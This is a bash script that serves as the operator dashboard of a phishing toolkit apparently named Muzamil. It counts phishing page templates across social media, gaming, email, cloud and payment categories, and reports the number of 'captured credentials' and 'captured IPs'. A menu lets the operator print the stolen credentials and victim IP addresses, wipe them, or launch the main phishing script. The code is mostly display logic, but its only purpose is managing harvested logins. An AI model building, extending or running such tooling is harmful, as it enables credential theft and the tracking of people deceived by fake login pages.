#!/bin/bash

# Muzamil Statistics Dashboard
# Author: MUZAMIL

# Colors
RED="\033[31m"
GREEN="\033[32m"
ORANGE="\033[33m"
BLUE="\033[34m"
MAGENTA="\033[35m"
CYAN="\033[36m"
WHITE="\033[37m"

# Banner
echo -e "${MAGENTA}"
echo "███╗   ███╗██╗   ██╗███████╗ █████╗ ███╗   ███╗██╗██╗"
echo "████╗ ████║██║   ██║╚══███╔╝██╔══██╗████╗ ████║██║██║"
echo "██╔████╔██║██║   ██║  ███╔╝ ███████║██╔████╔██║██║██║"
echo "██║╚██╔╝██║██║   ██║ ███╔╝  ██╔══██║██║╚██╔╝██║██║██║"
echo "██║ ╚═╝ ██║╚██████╔╝███████╗██║  ██║██║ ╚═╝ ██║██║███████╗"
echo "╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚══════╝"
echo -e "${CYAN}════════════════════════════════════════════════════════════════════"
echo -e "${WHITE}                    ${RED}Statistics Dashboard${WHITE}"
echo ""

# Get statistics
TOTAL_TEMPLATES=$(ls -1 .sites/ | grep -v "ip.php" | wc -l)
TOTAL_CREDENTIALS=$(cat auth/usernames.dat 2>/dev/null | wc -l || echo "0")
TOTAL_IPS=$(cat auth/ip.txt 2>/dev/null | wc -l || echo "0")
TOOL_VERSION="2.3.5"
AUTHOR="MUZAMIL"

# Display statistics
echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Tool Statistics:${WHITE}"
echo -e "${GREEN}├─${WHITE} Version: ${ORANGE}$TOOL_VERSION${WHITE}"
echo -e "${GREEN}├─${WHITE} Author: ${ORANGE}$AUTHOR${WHITE}"
echo -e "${GREEN}├─${WHITE} Total Templates: ${ORANGE}$TOTAL_TEMPLATES${WHITE}"
echo -e "${GREEN}├─${WHITE} Captured Credentials: ${ORANGE}$TOTAL_CREDENTIALS${WHITE}"
echo -e "${GREEN}└─${WHITE} Captured IPs: ${ORANGE}$TOTAL_IPS${WHITE}"
echo ""

# Template categories
echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Template Categories:${WHITE}"
echo -e "${GREEN}├─${WHITE} Social Media: ${ORANGE}9 templates${WHITE}"
echo -e "${GREEN}├─${WHITE} Gaming: ${ORANGE}5 templates${WHITE}"
echo -e "${GREEN}├─${WHITE} Email & Cloud: ${ORANGE}6 templates${WHITE}"
echo -e "${GREEN}├─${WHITE} Payment & Shopping: ${ORANGE}4 templates${WHITE}"
echo -e "${GREEN}├─${WHITE} Development: ${ORANGE}3 templates${WHITE}"
echo -e "${GREEN}└─${WHITE} Others: ${ORANGE}10 templates${WHITE}"
echo ""

# System information
echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} System Information:${WHITE}"
echo -e "${GREEN}├─${WHITE} OS: ${ORANGE}$(uname -s) $(uname -r)${WHITE}"
echo -e "${GREEN}├─${WHITE} Architecture: ${ORANGE}$(uname -m)${WHITE}"
echo -e "${GREEN}├─${WHITE} Shell: ${ORANGE}$SHELL${WHITE}"
echo -e "${GREEN}└─${WHITE} Working Directory: ${ORANGE}$(pwd)${WHITE}"
echo ""

# Recent activity
echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Recent Activity:${WHITE}"
if [[ -f "auth/usernames.dat" ]]; then
    echo -e "${GREEN}├─${WHITE} Last Credential: ${ORANGE}$(tail -1 auth/usernames.dat 2>/dev/null | cut -d: -f1 || echo "None")${WHITE}"
else
    echo -e "${GREEN}├─${WHITE} Last Credential: ${ORANGE}None${WHITE}"
fi

if [[ -f "auth/ip.txt" ]]; then
    echo -e "${GREEN}└─${WHITE} Last IP: ${ORANGE}$(tail -1 auth/ip.txt 2>/dev/null || echo "None")${WHITE}"
else
    echo -e "${GREEN}└─${WHITE} Last IP: ${ORANGE}None${WHITE}"
fi
echo ""

# Performance metrics
echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Performance Metrics:${WHITE}"
echo -e "${GREEN}├─${WHITE} Memory Usage: ${ORANGE}$(free -h | grep Mem | awk '{print $3"/"$2}')${WHITE}"
echo -e "${GREEN}├─${WHITE} Disk Usage: ${ORANGE}$(df -h . | tail -1 | awk '{print $5}')${WHITE}"
echo -e "${GREEN}└─${WHITE} Uptime: ${ORANGE}$(uptime -p 2>/dev/null || echo "Unknown")${WHITE}"
echo ""

# Quick actions
echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Quick Actions:${WHITE}"
echo -e "${GREEN}├─${WHITE} [1] View all credentials"
echo -e "${GREEN}├─${WHITE} [2] View all IPs"
echo -e "${GREEN}├─${WHITE} [3] Clear all data"
echo -e "${GREEN}├─${WHITE} [4] Run Muzamil"
echo -e "${GREEN}└─${WHITE} [5] Exit"
echo ""

read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option: ${BLUE}" choice

case $choice in
    1)
        if [[ -f "auth/usernames.dat" ]]; then
            echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Captured Credentials:${WHITE}"
            cat auth/usernames.dat
        else
            echo -e "\n${RED}[${WHITE}!${RED}]${RED} No credentials found!${WHITE}"
        fi
        ;;
    2)
        if [[ -f "auth/ip.txt" ]]; then
            echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Captured IPs:${WHITE}"
            cat auth/ip.txt
        else
            echo -e "\n${RED}[${WHITE}!${RED}]${RED} No IPs found!${WHITE}"
        fi
        ;;
    3)
        echo -e "\n${ORANGE}[${WHITE}!${ORANGE}]${ORANGE} Clearing all data...${WHITE}"
        rm -f auth/usernames.dat auth/ip.txt
        echo -e "${GREEN}[${WHITE}✓${GREEN}]${GREEN} Data cleared!${WHITE}"
        ;;
    4)
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Starting Muzamil...${WHITE}"
        bash muzamil.sh
        ;;
    5)
        echo -e "\n${GREEN}[${WHITE}✓${GREEN}]${GREEN} Goodbye!${WHITE}"
        exit 0
        ;;
    *)
        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Invalid option!${WHITE}"
        ;;
esac